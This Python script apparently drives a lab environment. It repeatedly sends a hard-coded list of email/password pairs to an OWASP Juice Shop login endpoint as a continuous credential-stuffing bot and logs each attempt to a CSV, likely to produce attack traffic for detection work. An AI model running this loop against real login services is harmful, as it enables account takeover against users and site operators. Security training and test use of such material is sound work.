import os
import requests
import time
import csv
import socket

import http.server
import socketserver
import threading

JUICESHOP_URL = os.getenv("JUICESHOP_URL", "http://juice-shop:3000")
LOGIN_ENDPOINT = f"{JUICESHOP_URL}/rest/user/login"
VICTIM_IP = os.getenv("VICTIM_IP", "juice-shop")

# --- Health Check Server ---
class HealthHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/livez':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "alive"}')
        elif self.path == '/readyz':
            # Logic: Check if dependent service is reachable? For bot, simple 200 is fine as it retries.
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "ready"}')
        elif self.path == '/startupz':
             # Logic: Check if config/credentials loaded? 
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "started"}')
        else:
             self.send_response(404)
             self.end_headers()

    def log_message(self, format, *args):
        return # Suppress log output

def start_health_server():
    try:
        with socketserver.TCPServer(("", 8000), HealthHandler) as httpd:
            print("[*] Health server running on port 8000")
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] Failed to start health server: {e}")

# Start health server in background
threading.Thread(target=start_health_server, daemon=True).start()

credentials = [
    ("admin@juice-sh.op", "admin123"),
    ("user1@juice-sh.op", "password"),
    ("bender@juice-sh.op", "insane"),
    ("jim@juice-sh.op", "ncc-1701"),
    ("mc.safesearch@juice-sh.op", "6ed4078"),
    ("test@test.com", "test1234"),
    ("root@juice-sh.op", "root"),
    ("guest@juice-sh.op", "guest")
]

output_file = "/data/bot_attempts.csv"

# 1. Wait for Juice Shop to be ready
print("[*] Waiting for juiceshop:3000 to be ready...")
while True:
    try:
        with socket.create_connection((VICTIM_IP, 3000), timeout=2):
            print("[+] Juiceshop is up!")
            break
    except (socket.timeout, ConnectionRefusedError, OSError): 
        time.sleep(2)

# 2. Start Bot Attack (Credential Stuffing)
print("[*] Starting Continuous Credential Stuffing Bot Attack...")

# Initialize output file header
with open(output_file, "w", newline="") as f:
    writer = csv.DictWriter(f, fieldnames=["timestamp", "attack_type", "username", "http_status", "response_time"])
    writer.writeheader()

while True:
    try:
        results = []
        for email, password in credentials:
            payload = {"email": email, "password": password}
            start_time = time.time()
            try:
                response = requests.post(LOGIN_ENDPOINT, json=payload)
                end_time = time.time()
                
                results.append({
                    "timestamp": start_time,
                    "attack_type": "Bot (Credential Stuffing)",
                    "username": email,
                    "http_status": response.status_code,
                    "response_time": round(end_time - start_time, 4)
                })
                print(f"[+] Attempt: {email} | Status: {response.status_code}")
            except Exception as e:
                print(f"[-] Request failed for {email}: {e}")
            
            time.sleep(0.5) # Fast but not instant to simulate a bot

        # Append results to file after each batch
        with open(output_file, "a", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["timestamp", "attack_type", "username", "http_status", "response_time"])
            writer.writerows(results)
            
        print("[*] Batch completed. Sleeping briefly...")
        time.sleep(5) 
        
    except Exception as e:
        print(f"[-] Error in attack loop: {e}")
        time.sleep(5)
